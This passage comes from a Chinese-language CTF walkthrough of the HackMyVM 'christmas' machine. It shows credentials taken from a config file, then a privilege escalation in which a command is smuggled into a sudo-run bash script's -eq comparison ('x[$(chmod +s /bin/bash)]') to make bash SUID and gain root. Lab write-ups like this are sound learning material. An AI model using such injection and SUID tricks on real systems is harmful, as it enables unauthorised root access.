drwxr-xr-x  3 root    root      4096 Nov 13 16:55 ..
lrwxrwxrwx  1 root    root         9 Nov 18 12:58 .bash_history -> /dev/null
-rw-r--r--  1 mr-jack mr-jack    220 Dec 25 00:00 .bash_logout
-rw-r--r--  1 mr-jack mr-jack   3526 Dec 25 00:00 .bashrc
drwxr-xr-x  4 mr-jack mr-jack   4096 Dec 25 00:00 .config
drwxr-xr-x  3 mr-jack mr-jack   4096 Dec 25 00:00 .local
drwxr-xr-x 12 mr-jack mr-jack   4096 Dec 25 00:00 .oh-my-zsh
-rw-r--r--  1 mr-jack mr-jack    807 Dec 25 00:00 .profile
drwx------  2 mr-jack mr-jack   4096 Nov 18 10:44 .ssh
-rw-r--r--  1 mr-jack mr-jack  51816 Nov 17 18:22 .zcompdump-christmas-5.9
-r--r--r--  1 mr-jack mr-jack 119928 Nov 17 18:22 .zcompdump-christmas-5.9.zwc
-rw-r--r--  1 mr-jack mr-jack  51816 Dec 25 00:00 .zcompdump-debian-5.9
-r--r--r--  1 mr-jack mr-jack 119920 Dec 25 00:00 .zcompdump-debian-5.9.zwc
-rw-r--r--  1 mr-jack mr-jack   3890 Dec 25 00:00 .zshrc
-rwx------  1 mr-jack mr-jack     33 Dec 25 00:00 user.txt
(remote) www-data@christmas.hmv:/home/mr-jack$ cat user.txt
cat: user.txt: Permission denied
(remote) www-data@christmas.hmv:/home/mr-jack$ cd .config
(remote) www-data@christmas.hmv:/home/mr-jack/.config$ ls -la
total 16
drwxr-xr-x  4 mr-jack mr-jack 4096 Dec 25 00:00 .
drwxr-xr-x  6 mr-jack mr-jack 4096 Nov 18 12:58 ..
dr-xr-xr-x+ 2 mr-jack mr-jack 4096 Dec 25 00:00 .SecureGateway
drwx------  3 mr-jack mr-jack 4096 Apr  2 12:22 syncthing
(remote) www-data@christmas.hmv:/home/mr-jack/.config$ cd .SecureGateway/
(remote) www-data@christmas.hmv:/home/mr-jack/.config/.SecureGateway$ ls -la
total 12
dr-xr-xr-x+ 2 mr-jack mr-jack 4096 Dec 25 00:00 .
drwxr-xr-x  4 mr-jack mr-jack 4096 Dec 25 00:00 ..
-rwxr-xr-x  1 mr-jack mr-jack 1073 Dec 25 00:00 firewall_config.conf
(remote) www-data@christmas.hmv:/home/mr-jack/.config/.SecureGateway$ cat firewall_config.conf 
# Example Firewall Configuration File - firewall_config.conf
FirewallName = "ChristmasSecureGateway"
Manufacturer = "Christmas Technologies"
Model = "XMAS-FW1000"
FirmwareVersion = "2023.1"
ManagementInterface = "eth0"
ManagementIP = "192.168.100.1"
InternalInterface = "eth1"
InternalIPRange = "192.168.0.0/24"
ExternalInterface = "eth2"
ExternalIP = "203.0.113.5"
NAT = "Enabled"
ALLOW 192.168.0.0/24 Any IP Any
DENY Any Any IP 23
DENY Any Any IP 21
RDP 203.0.113.5:3389 -> 192.168.0.10:3389
HTTP 203.0.113.5:80 -> 192.168.0.20:80
VPNType = "OpenVPN"
VPNServerIP = "192.168.100.2"
VPNPort = 1194
Encryption = "AES-256-CBC"
WebInterface = "https://192.168.100.1:8080"
APIEndpoint = "https://192.168.100.1/api"
AdminPortalURL = "https://mr-jack:m3rrychr157m4523@192.168.100.1:8080/login"
SyslogServer = "192.168.100.10"
LogLevel = "Info"
AuditTrail = "Enabled"
IntrusionPreventionSystem = "Enabled"
AntiVirus = "Enabled"
AntiSpyware = "Enabled"
AutoUpdate = "Enabled"
UpdateServer = "https://update.christmas.hmv"
LastUpdateCheck = "2023-03-01"
# End of Configuration File
```

找到了账号密码：

```bash
mr-jack
m3rrychr157m4523
```

### 切换mr-jack

```bash
(remote) www-data@christmas.hmv:/home/mr-jack/.config/.SecureGateway$ su mr-jack
Password: 
╭─mr-jack@christmas ~/.config/.SecureGateway 
╰─$ 
╭─mr-jack@christmas ~/.config/.SecureGateway 
╰─$ cd ../../
╭─mr-jack@christmas ~ 
╰─$ ls
user.txt
╭─mr-jack@christmas ~ 
╰─$ cat user.txt
caf45c355c29186bb9d8ab89f7811bf0
╭─mr-jack@christmas ~ 
╰─$ sudo -l
Matching Defaults entries for mr-jack on christmas:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mr-jack may run the following commands on christmas:
    (ALL : ALL) NOPASSWD: /opt/GiftPursuit
```

看看这个东西：

```bash
╭─mr-jack@christmas ~ 
╰─$ cd /opt  
╭─mr-jack@christmas /opt 
╰─$ ls
GiftPursuit
╭─mr-jack@christmas /opt 
╰─$ file GiftPursuit 
GiftPursuit: Bourne-Again shell script, Unicode text, UTF-8 text executable
╭─mr-jack@christmas /opt 
╰─$ cat GiftPursuit 
#!/bin/bash

if [[ "$#" -eq 0 ]] ; then
  echo "🎄🎄🎄🎄🎄🎄🎄🎄🎄"
  echo -e "\nUsage: $0 number\n"
  echo "🎄🎄🎄🎄🎄🎄🎄🎄🎄"
  exit 1
fi  

NUMBER=$(openssl rand -hex 45 |tr -dc "0-9" |head -c 40)

if [[ "${NUMBER}" -eq "${1}" ]] ; then 
  echo "Here's your Christmas gift !"
  chmod o+s /bin/bash
else
  echo "No ! If you want a gift, try hard !"
  exit 1
fi
```

- 检查脚本是否接收了任何参数（`$#` 表示传递给脚本的参数数量）。如果没有参数（`-eq 0`），则输出一个使用说明并退出脚本，返回状态码1（通常表示错误）。
- 使用`openssl`命令生成一个随机的十六进制字符串，长度为45个字符。然后，使用`tr`命令移除所有非数字字符，最后用`head`命令截取前40个字符，并将这个40位数字的随机字符串赋值给变量`NUMBER`
- 检查前面生成的`NUMBER`变量是否等于脚本的第一个参数（`$1`）。如果相等，则输出“Here's your Christmas gift !”并尝试修改`/bin/bash`的权限。

肯定不是头铁搞出来的，尝试其他的方法，先运行一下：

```bash
╭─mr-jack@christmas /opt 
╰─$ sudo /opt/GiftPursuit "12345"                                                                                                
No ! If you want a gift, try hard !
```

### -eq 特性

它没有对输入进行过滤，尝试进行构造，执行命令：

作者的wp有这样的解释：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019332.png" alt="image-20240402201224804" style="zoom:50%;" />

> 在Bash中，当使用-eq运算符时，它首先尝试。
> 解释并执行参数，包括命令。
> 类似于\$(命令)的替换。如果参数是字符串。
> (如‘x[\$(Touch LOL)]’)，执行$(Touch LOL)部分。
> 在数字比较之前。

算是一种特性吧，学到了，我们可以利用这个特性进行提权：

```
sudo /opt/GiftPursuit 'x[$(chmod +s /bin/bash)]'
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019333.png" alt="image-20240402201728516" style="zoom:50%;" />

这样的话bash就有了suid权限，直接提权即可：

```bash
╭─mr-jack@christmas /opt 
╰─$ /bin/bash -p
(remote) root@christmas.hmv:/opt# cd /root
(remote) root@christmas.hmv:/root# ls 
root.txt
(remote) root@christmas.hmv:/root# cat root.txt
93ba7e97218f577271c3867abf31ae8a
```

得到flag。。。。真是酣畅淋漓啊，裂开了。

## 参考

https://zhuanlan.zhihu.com/p/518320174

https://www.youtube.com/watch?v=HCLARBhJbvo

https://caiguanhao.wordpress.com/2013/06/17/linux-pptp-vpn/

https://liotree.github.io/2023/webid.html
